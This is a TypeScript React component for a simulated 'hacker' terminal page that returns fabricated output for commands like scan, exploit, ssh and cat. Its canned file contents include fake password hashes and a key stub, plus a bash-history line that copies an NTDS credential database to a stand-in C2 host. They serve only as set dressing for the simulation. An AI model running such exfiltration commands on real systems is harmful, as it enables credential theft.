"use client";

import { Suspense, useEffect, useRef, useState } from "react";
import { useSearchParams } from "next/navigation";
import { useSim, type Host } from "../../sim/context";
import { useSound } from "../../components/Shell";
import s from "../console.module.css";
import t from "./terminal.module.css";

type Line = { kind: "in" | "out" | "bright" | "err"; text: string };

const BANNER: Line[] = [
  { kind: "bright", text: "BLACKSITE shell // build 2.6.0-rc — simulated environment" },
  { kind: "out", text: "all output is fabricated for demonstration. type `help`." },
];

const HELP = [
  "help              this list",
  "scan [subnet]     sweep a subnet for live hosts",
  "hosts             list discovered hosts with status",
  "exploit <host>    attempt access on a target",
  "ssh <host>        connect to an owned host",
  "exit              disconnect from current host",
  "ls                list files on current host",
  "cat <file>        read a file",
  "ps                list running processes",
  "ifconfig          show network config",
  "loot              show captured artifacts",
  "whoami            current operator context",
  "status            link + circuit status",
  "history           command history",
  "clear             wipe the screen",
];

const COMMANDS = ["help", "scan", "hosts", "exploit", "ssh", "exit", "ls", "cat", "ps", "ifconfig", "loot", "whoami", "status", "history", "clear"];

const LOOT = [
  "ad_hashes.ntds        1,204 entries     12.4 MB",
  "vpn_config.ovpn       1 file            8.1 KB",
  "db_dump_finance.sql   partial           2.2 GB",
  "kerberos.tickets      37 TGTs           440 KB",
];

const HOST_FILES: Record<string, Record<string, string>> = {
  "edge-fw-01": {
    "config.bak": "interface: wan1\nip: 14.221.9.40/24\ngateway: 14.221.9.1\nfirewall_policy: ALLOW * (misconfigured)",
    "passwd.bak": "root:$6$x9f2.aQ::0:0:root:/root:/bin/sh\nadmin:$6$kLm3.pR::1000:1000:admin:/home/admin:/bin/bash",
    "access.log": "[03:14:22] SYN from 10.0.4.12:445 -> ACCEPT\n[03:14:23] SYN from 10.0.4.77:3389 -> DROP\n[03:14:41] SYN from 10.0.1.1:443 -> ACCEPT",
  },
  "win-dc-02": {
    "ntds.dit": "[binary] NTDS database — 1,204 entries — 12.4 MB",
    "krbtgt.key": "AES256-CTS: 7F3A9C20DE114488AAB20091FFC3E771...",
    "gpo_audit.log": "2024-03-15 Failed login: svc_backup@corp.local x47\n2024-03-15 Group Policy updated: Default Domain Policy\n2024-03-15 Kerberoast detected: krbtgt",
    "sam.bak": "Administrator:500:aad3b435...:31d6cfe0d16ae931b73c59d7e0c089c0\nGuest:501:aad3b435...:disabled",
  },
  "jump-box": {
    ".bash_history": "ssh admin@10.0.4.12\nscp ntds.dit ghost@c2:/loot/\nnmap -sS 10.0.4.0/24\ncurl http://10.0.9.5/api/status",
    "id_rsa": "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmU...\n-----END OPENSSH PRIVATE KEY-----",
    "tunnel.sh": "#!/bin/bash\nssh -D 1080 -N -f admin@10.0.1.1\necho 'SOCKS proxy on :1080'",
  },
  "sql-07": {
    "tables.txt": "dbo.Customers      142,881 rows\ndbo.Transactions   3,441,002 rows\ndbo.Credentials    12 rows (encrypted)\ndbo.AuditLog       890,112 rows",
    "query.log": "SELECT * FROM dbo.Credentials WHERE role='admin'\nDROP TABLE dbo.AuditLog -- failed: permission denied",
  },
  "vpn-gw": {
    "server.conf": "port 1194\nproto udp\ndev tun\ncipher AES-256-GCM\nauth SHA512\nca ca.crt\ncert server.crt\nkey server.key",
    "client-list.txt": "ghost-14    10.8.0.2    2024-03-15 03:10\nexec-vpn    10.8.0.3    2024-03-14 22:41\nsvc-backup  10.8.0.4    2024-03-15 01:05",
  },
  "bak-vault": {
    "backup_schedule.conf": "DAILY  02:00  /mnt/finance  ->  /vault/finance.tar.gz.enc\nWEEKLY 04:00  /mnt/full     ->  /vault/full_backup.tar.gz.enc\nKEY: AES-256-GCM (stored in HSM)",
    "restore.log": "last restore: 2024-02-28 — full — OK\nintegrity check: 2024-03-14 — PASS",
  },
  "mail-relay": {
    "main.cf": "smtpd_banner = mail.corp.local ESMTP\nmyhostname = mail.corp.local\nmynetworks = 10.0.0.0/8\nsmtpd_tls_cert_file = /etc/ssl/mail.crt",
    "maillog": "Mar 15 03:22:01 relay postfix/smtpd: connect from edge-fw[14.221.9.40]\nMar 15 03:22:02 relay postfix/smtpd: RCPT TO:<admin@corp.local> from=<ghost@c2>",
  },
};

const HOST_PROCS: Record<string, string[]> = {
  "edge-fw-01": ["PID 1  init", "PID 44 sshd", "PID 102 fgt_httpsd", "PID 218 implant_fw (hidden)"],
  "win-dc-02": ["PID 4   System", "PID 672 lsass.exe", "PID 1204 svchost.exe", "PID 3312 beacon.exe (hidden)"],
  "jump-box": ["PID 1  systemd", "PID 88 sshd", "PID 341 tmux", "PID 502 nmap -sS 10.0.4.0/24"],
};

function defaultFiles(): Record<string, string> {
  return {
    ".profile": "export PS1='ghost@blacksite:~$ '",
    "ops.log": "-- end of log --",
  };
}

export default function TerminalPage() {
  return (
    <Suspense>
      <TerminalInner />
    </Suspense>
  );
}

function TerminalInner() {
  const sim = useSim();
  const { playKey } = useSound();
  const params = useSearchParams();
  const [lines, setLines] = useState<Line[]>(BANNER);
  const [val, setVal] = useState("");
  const [hist, setHist] = useState<string[]>([]);
  const [hi, setHi] = useState(-1);
  const [cwd, setCwd] = useState<string | null>(null);
  const bodyRef = useRef<HTMLDivElement>(null);
  const inputRef = useRef<HTMLInputElement>(null);
  const hostsRef = useRef(sim.hosts);
  hostsRef.current = sim.hosts;
  const initRan = useRef(false);

  useEffect(() => {
    if (initRan.current) return;
    initRan.current = true;
    const host = params.get("host");
    if (host) {
      const h = sim.hosts.find(x => x.id === host);
      if (h && h.status === "OWNED") {
        setCwd(h.id);
        setLines(prev => [...prev, { kind: "bright", text: `connected to ${h.name} (${h.ip})` }]);
      } else if (h) {
        setLines(prev => [...prev, { kind: "out", text: `target ${h.name} is not yet owned — status: ${h.status}` }]);
      }
    }
  }, [params, sim.hosts]);

  useEffect(() => {
    bodyRef.current?.scrollTo(0, bodyRef.current.scrollHeight);
  }, [lines]);

  const ps1 = cwd ? `root@${cwd}:#` : "ghost@blacksite:~$";

  function run(raw: string): Line[] {
    const [cmd, ...args] = raw.trim().split(/\s+/);
    const hosts = hostsRef.current;

    switch (cmd) {
      case "help":
        return HELP.map(h => ({ kind: "out", text: "  " + h }));

      case "hosts":
        return [
          { kind: "out", text: "ADDRESS         HOSTNAME       STATUS" },
          ...hosts.map(h => ({
            kind: (h.status === "OWNED" ? "bright" : "out") as "bright" | "out",
            text: `  ${h.ip.padEnd(16)}${h.name.padEnd(15)}${h.status}`,
          })),
        ];

      case "scan": {
        const net = args[0] || "10.0.0.0/24";
        const alive = hosts.filter(h => h.status !== "QUEUED").length;
        const owned = hosts.filter(h => h.status === "OWNED").length;
        return [
          { kind: "out", text: `sweeping ${net} ...` },
          { kind: "out", text: `  [####################] ${hosts.length}/${hosts.length}` },
          { kind: "bright", text: `  ${alive} live hosts · ${owned} owned · ${hosts.length - alive} dark` },
        ];
      }

      case "exploit": {
        const target = args[0];
        if (!target) return [{ kind: "err", text: "usage: exploit <host>" }];
        const h = hosts.find(x => x.name === target || x.id === target);
        if (!h) return [{ kind: "err", text: `${target}: host not found — try \`hosts\`` }];
        if (h.status === "OWNED") return [{ kind: "out", text: `${h.name} is already owned` }];
        sim.exploitHost(h.id);
        return [
          { kind: "out", text: `staging payload against ${h.name} (${h.ip}) ...` },
          { kind: "out", text: "  CVE-2024-XXXX :: heap overflow ...... matched" },
          { kind: "out", text: "  bypassing edr ...................... ok" },
          { kind: "bright", text: `  shell opened on ${h.name} :: root` },
        ];
      }

      case "ssh": {
        const target = args[0];
        if (!target) return [{ kind: "err", text: "usage: ssh <host>" }];
        const h = hosts.find(x => x.name === target || x.id === target);
        if (!h) return [{ kind: "err", text: `${target}: host not found` }];
        if (h.status !== "OWNED") return [{ kind: "err", text: `${h.name}: access denied — not yet owned` }];
        setCwd(h.id);
        return [{ kind: "bright", text: `connected to ${h.name} (${h.ip})` }];
      }

      case "exit":
        if (!cwd) return [{ kind: "out", text: "already at base" }];
        setCwd(null);
        return [{ kind: "out", text: "disconnected — back at c2" }];

      case "ls": {
        const files = cwd ? (HOST_FILES[cwd] || defaultFiles()) : defaultFiles();
        return Object.keys(files).map(f => ({ kind: "out" as const, text: "  " + f }));
      }

      case "cat": {
        const file = args[0];
        if (!file) return [{ kind: "err", text: "usage: cat <file>" }];
        const files = cwd ? (HOST_FILES[cwd] || defaultFiles()) : defaultFiles();
        const content = files[file];
        if (!content) return [{ kind: "err", text: `${file}: no such file` }];
        return content.split("\n").map(l => ({ kind: "bright" as const, text: "  " + l }));
      }

      case "ps": {
        const procs = cwd ? (HOST_PROCS[cwd] || ["PID 1  init", "PID 88 sshd"]) : [
          "PID 1  c2-daemon",
          "PID 14 beacon-mux (47 active)",
          "PID 22 exfil-queue",
          "PID 30 circuit-mgr (7 hops)",
        ];
        return [
          { kind: "out", text: "  PID  COMMAND" },
          ...procs.map(p => ({ kind: "out" as const, text: "  " + p })),
        ];
      }

      case "ifconfig": {
        if (cwd) {
          const h = hosts.find(x => x.id === cwd);
          return [
            { kind: "out", text: `  eth0: ${h?.ip || "10.0.0.1"}/24  UP` },
            { kind: "out", text: `  lo:   127.0.0.1/8  UP` },
          ];
        }
        return [
          { kind: "out", text: "  tun0: 10.8.0.1/24  UP (VPN)" },
          { kind: "out", text: "  eth0: 172.16.0.2/16  UP" },
          { kind: "out", text: "  lo:   127.0.0.1/8  UP" },
        ];
      }

      case "loot":
        return [
          { kind: "out", text: "ARTIFACT              DETAIL            SIZE" },
          ...LOOT.map(l => ({ kind: "bright" as const, text: "  " + l })),
        ];

      case "whoami":
        return [
          { kind: "bright", text: cwd ? `root@${cwd}` : "operator: GHOST" },
          { kind: "out", text: `clearance: OMEGA · session GHOST-14 · node 0x4F.AE.11` },
        ];

      case "status":
        return [
          { kind: "out", text: `link ........ SECURE (41ms, 7 hops)` },
          { kind: "out", text: `circuit ..... 99.4% integrity` },
          { kind: "out", text: `implants .... ${hosts.filter(h => h.status === "OWNED").length} active / ${hosts.length} hosts` },
        ];

      case "history":
        return hist.map((h, i) => ({ kind: "out" as const, text: `  ${String(i + 1).padStart(4)} ${h}` }));

      case "":
        return [];

      default:
        return [{ kind: "err", text: `${cmd}: command not found — try \`help\`` }];
    }
  }

  function submit(raw: string) {
    const entry: Line = { kind: "in", text: raw };
    if (raw.trim() === "clear") {
      setLines([]);
      return;
    }
    setLines(ls => [...ls, entry, ...run(raw)]);
    if (raw.trim()) setHist(h => [...h, raw]);
    setHi(-1);
  }

  function tabComplete(current: string): string | null {
    const parts = current.split(/\s+/);
    if (parts.length <= 1) {
      const matches = COMMANDS.filter(c => c.startsWith(parts[0]));
      if (matches.length === 1) return matches[0] + " ";
    } else {
      const arg = parts[parts.length - 1];
      const cmd = parts[0];
      if (["exploit", "ssh", "scan"].includes(cmd)) {
        const names = sim.hosts.map(h => h.name);
        const matches = names.filter(n => n.startsWith(arg));
        if (matches.length === 1) {
          parts[parts.length - 1] = matches[0];
          return parts.join(" ");
        }
      }
      if (cmd === "cat") {
        const files = cwd ? (HOST_FILES[cwd] || defaultFiles()) : defaultFiles();
        const names = Object.keys(files);
        const matches = names.filter(n => n.startsWith(arg));
        if (matches.length === 1) {
          parts[parts.length - 1] = matches[0];
          return parts.join(" ");
        }
      }
    }
    return null;
  }

  function onKey(e: React.KeyboardEvent<HTMLInputElement>) {
    if (e.key === "Tab") {
      e.preventDefault();
      const completed = tabComplete(val);
      if (completed) setVal(completed);
      return;
    }
    if (e.key === "Enter") {
      submit(val);
      setVal("");
    } else if (e.key === "ArrowUp") {
      e.preventDefault();
      if (!hist.length) return;
      const ni = hi < 0 ? hist.length - 1 : Math.max(0, hi - 1);
      setHi(ni);
      setVal(hist[ni]);
    } else if (e.key === "ArrowDown") {
      e.preventDefault();
      if (hi < 0) return;
      const ni = hi + 1;
      if (ni >= hist.length) { setHi(-1); setVal(""); }
      else { setHi(ni); setVal(hist[ni]); }
    }
  }

  return (
    <>
      <div className={s.pageHead}>
        <div>
          <h1 className={s.pageTitle}>Shell</h1>
          <p className={s.pageDesc}>
            Interactive operator console. Sandboxed and fully simulated. Try{" "}
            <span style={{ color: "var(--ink)" }}>scan</span>,{" "}
            <span style={{ color: "var(--ink)" }}>hosts</span>,{" "}
            <span style={{ color: "var(--ink)" }}>exploit</span>,{" "}
            <span style={{ color: "var(--ink)" }}>ssh</span>,{" "}
            <span style={{ color: "var(--ink)" }}>ls</span>,{" "}
            <span style={{ color: "var(--ink)" }}>cat</span>.
            Tab completes.
          </p>
        </div>
        <div className={s.pageTag}>PTY // /dev/ghost</div>
      </div>

      <div className={t.term} onClick={() => inputRef.current?.focus()}>
        <div className={t.termHead}>
          <div className={t.dots}>
            <span className={t.dot} />
            <span className={t.dot} />
            <span className={t.dot} />
          </div>
          <span className={t.termTitle}>{cwd ? `root@${cwd}` : "ghost@blacksite"} — bash</span>
          <span className={t.termTitle}>80×24</span>
        </div>

        <div className={t.body} ref={bodyRef}>
          {lines.map((l, i) => {
            if (l.kind === "in")
              return (
                <div key={i} className={t.line}>
                  <span className={t.ps1}>{ps1}</span>{" "}
                  <span className={t.user}>{l.text}</span>
                </div>
              );
            const cls =
              l.kind === "bright" ? t.outBright :
              l.kind === "err" ? t.err : t.out;
            return (
              <div key={i} className={`${t.line} ${cls}`}>
                {l.text}
              </div>
            );
          })}
        </div>

        <div className={t.inputRow}>
          <span className={t.ps1}>{ps1}</span>
          <input
            ref={inputRef}
            className={t.input}
            value={val}
            spellCheck={false}
            autoComplete="off"
            autoFocus
            onChange={e => { setVal(e.target.value); playKey(); }}
            onKeyDown={onKey}
            aria-label="terminal input"
          />
        </div>
      </div>

      <div className={t.hint}>
        ↑/↓ history · TAB complete · `help` for commands · `clear` to reset
      </div>
    </>
  );
}
